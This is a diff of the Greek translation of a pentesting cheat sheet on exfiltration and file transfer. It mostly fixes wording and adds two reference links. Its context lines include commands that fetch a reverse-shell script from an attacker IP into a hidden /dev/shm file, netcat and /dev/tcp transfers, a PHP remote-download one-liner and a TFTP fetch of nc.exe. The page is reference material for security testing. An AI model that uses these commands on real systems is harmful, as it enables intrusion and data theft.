@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Συνηθισμένοι τομείς που έχουν επιτραπεί για την εξαγωγή πληροφοριών
+## Συνήθεις τομείς που έχουν επιτραπεί για την εξαγωγή πληροφοριών
 
-Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνηθισμένους τομείς που μπορούν να καταχραστούν
+Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθεις τομείς που μπορούν να καταχραστούν
 
 ## Αντιγραφή\&Επικόλληση Base64
 
@@ -20,7 +20,7 @@ certutil -decode payload.b64 payload.dll
 ```
 ## HTTP
 
-**Λίνουξ**
+**Linux**
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ή δημιουργήστε ένα smb share **χρησιμοποιώντας samba**:
+Ή δημιουργήστε ένα smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -206,7 +206,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-ευχαριστίες στον **@BinaryShadow\_**
+ευχαριστώ τον **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -234,7 +234,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Κατά προεπιλογή σε XP και 2003 (σε άλλες εκδόσεις πρέπει να προστεθεί ρητά κατά την εγκατάσταση)
+Κατά προεπιλογή σε XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)
 
 Στο Kali, **ξεκινήστε τον διακομιστή TFTP**:
 ```bash
@@ -254,7 +254,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατεβάστε ένα αρχείο με μια PHP oneliner:
+Κατεβάστε ένα αρχείο με ένα PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Στη συνέχεια, επικολλήστε το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο με όνομα nc.exe.
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
